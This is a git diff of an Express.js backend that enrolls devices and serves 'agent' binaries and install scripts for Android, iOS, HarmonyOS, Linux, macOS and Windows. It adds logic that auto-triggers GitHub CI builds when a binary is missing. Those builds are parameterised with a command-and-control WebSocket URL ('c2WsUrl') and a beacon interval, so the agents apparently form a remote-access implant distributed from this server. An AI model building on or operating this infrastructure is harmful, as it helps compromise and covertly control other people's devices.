@@ -199,11 +199,51 @@ router.post("/devices/enroll", authRequired, (req, res) => {
   res.json({ links, expiresAt, label: label || "agent", ttl });
 });
 
+// ── GET /v1/agent/status/:platform ───────────────────────────────────────
+// Public — called by EnrollPage to check binary availability before attempting download.
+// Returns { platform, available, downloadUrl, building, retryAfter, message }
+router.get("/agent/status/:platform", (req, res) => {
+  const { platform } = req.params;
+  const KNOWN = ["android", "ios", "harmony", "linux", "macos", "windows"];
+  if (!KNOWN.includes(platform)) {
+    return res.status(400).json({ error: "Unknown platform", supported: KNOWN });
+  }
+
+  const url = binaryUrls[platform];
+  if (url) {
+    return res.json({ platform, available: true, downloadUrl: url, building: false, retryAfter: null });
+  }
+
+  const hasCI = !!(process.env.GITHUB_TOKEN && process.env.GITHUB_REPO);
+  return res.json({
+    platform,
+    available: false,
+    downloadUrl: null,
+    building: hasCI,
+    retryAfter: hasCI ? 180 : null,
+    message: hasCI
+      ? `Build is queued or in progress. Binary ready in ~3–10 min.`
+      : `CI not configured. GITHUB_TOKEN and GITHUB_REPO must be set on the server.`,
+  });
+});
+
+// In-memory cooldown: don't spam GitHub dispatch more than once per 10 min per platform
+const _lastAutoTrigger = {};
+const _AUTO_TRIGGER_COOLDOWN_MS = 10 * 60 * 1000;
+
+const _WORKFLOW_FOR_PLATFORM = {
+  android: "build-android.yml",
+  ios:     "build-ios.yml",
+  harmony: "build-harmony.yml",
+  linux:   "build-linux.yml",
+  macos:   "build-macos.yml",
+  windows: "build-windows.yml",
+};
+
 // ── GET /v1/agent/download/:file ──────────────────────────────────────────
 // linux.sh / macos.sh / windows.ps1 — served from static script templates
 // ios-manifest.plist                — served from static template
-// *.apk / *.ipa / *.hap            — served from persistent disk or CI release redirect
-// *.tar.gz / *.pkg / *.zip         — redirected to CI release URL via binaryUrls
+// *.apk / *.ipa / *.hap / *.pkg / *.zip / *.tar.gz — CI binary (auto-trigger if missing)
 router.get("/agent/download/:file", (req, res) => {
   const { file } = req.params;
   const BACK   = process.env.BACKEND_URL || "https://bixtx.onrender.com";
@@ -299,18 +339,38 @@ router.get("/agent/download/:file", (req, res) => {
     return res.redirect(302, binaryUrls[platform]);
   }
 
-  const triggerHints = {
-    android: "Trigger a build via POST /v1/build/android, or push to the software-android/ branch to start CI.",
-    ios:     "Trigger a build via POST /v1/build/ios. Requires Apple signing secrets in GitHub.",
-    harmony: "Trigger a build via POST /v1/build/harmony. Requires Huawei signing secrets in GitHub.",
-    linux:   "Trigger a build via POST /v1/build/linux, or push to the software-linux/ branch to start CI.",
-    macos:   "Trigger a build via POST /v1/build/macos, or push to the software-macos/ branch to start CI.",
-    windows: "Trigger a build via POST /v1/build/windows, or push to the software-windows/ branch to start CI.",
-  };
+  // Binary not on disk and not in binaryUrls — auto-trigger CI build (with cooldown)
+  const ghToken = process.env.GITHUB_TOKEN;
+  const ghRepo  = process.env.GITHUB_REPO;
+  const workflow = platform && _WORKFLOW_FOR_PLATFORM[platform];
 
+  if (ghToken && ghRepo && workflow) {
+    const now      = Date.now();
+    const lastTime = _lastAutoTrigger[platform] || 0;
+
+    if (now - lastTime > _AUTO_TRIGGER_COOLDOWN_MS) {
+      _lastAutoTrigger[platform] = now;
+      triggerGHWorkflow(ghToken, ghRepo, workflow, {
+        c2WsUrl:        C2_URL_DEFAULT,
+        beaconInterval: BEACON_DEFAULT,
+      }).catch(err => logger.warn(`[Build] Auto-trigger ${platform} failed: ${err.message}`));
+      logger.info(`[Build] Auto-triggered ${platform} build on download attempt`);
+    }
+
+    return res.status(202).json({
+      status:     "building",
+      platform,
+      message:    `Build triggered for ${platform}. Binary will be ready in ~3–10 minutes. Poll /v1/agent/status/${platform} to check.`,
+      retryAfter: 180,
+      pollUrl:    `/v1/agent/status/${platform}`,
+    });
+  }
+
+  // GitHub CI not configured at all
   return res.status(404).json({
-    error: "Binary not built yet",
-    message: triggerHints[platform] || "Binary not available.",
+    error:   "Binary not built yet — CI not configured",
+    message: "Set GITHUB_TOKEN and GITHUB_REPO environment variables on the server to enable automatic builds.",
+    pollUrl: `/v1/agent/status/${platform}`,
   });
 });
 
@@ -897,16 +957,5 @@ router.get("/stats", authRequired, (req, res) => {
   });
 });
 
-router.post("/build/android/notify", (req, res) => {
-  const { status, downloadUrl, secret } = req.body;
-  if (secret !== process.env.RENDER_APK_NOTIFY_SECRET) {
-    return res.status(401).json({ error: "Unauthorized" });
-  }
-  if (status === "completed" && downloadUrl) {
-    if (typeof binaryUrls !== 'undefined') {
-      binaryUrls.android = downloadUrl;
-    }
-  }
-  res.json({ success: true, message: "Build status updated" });
-});
 module.exports = router;
+module.exports.enqueueUpgradeProposal = enqueueUpgradeProposal;
